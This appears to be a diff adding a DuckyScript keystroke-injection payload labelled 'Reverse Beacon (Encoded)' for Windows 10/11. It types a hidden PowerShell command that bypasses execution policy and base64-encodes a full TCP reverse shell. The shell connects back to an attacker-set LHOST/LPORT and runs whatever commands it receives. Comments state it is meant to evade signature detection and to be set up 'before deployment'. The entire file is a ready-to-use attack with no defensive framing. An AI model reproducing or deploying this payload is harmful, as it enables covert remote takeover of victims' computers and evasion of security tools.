@@ -1,0 +1,13 @@
+REM ================================================
+REM  FLLC — Reverse Beacon (Encoded)
+REM  Establishes an encoded reverse connection beacon.
+REM  Uses base64 to evade signature detection.
+REM  Target: Windows 10/11 | Time: ~6 seconds
+REM  NOTE: Set LHOST/LPORT before deployment.
+REM ================================================
+
+DELAY 800
+GUI r
+DELAY 500
+STRING powershell -w hidden -nop -ep bypass -c "$e=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('$c=New-Object Net.Sockets.TCPClient(\"LHOST\",LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+\"PS \"+(pwd).Path+\"> \";$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()'));powershell -w hidden -nop -ep bypass -enc $e"
+ENTER
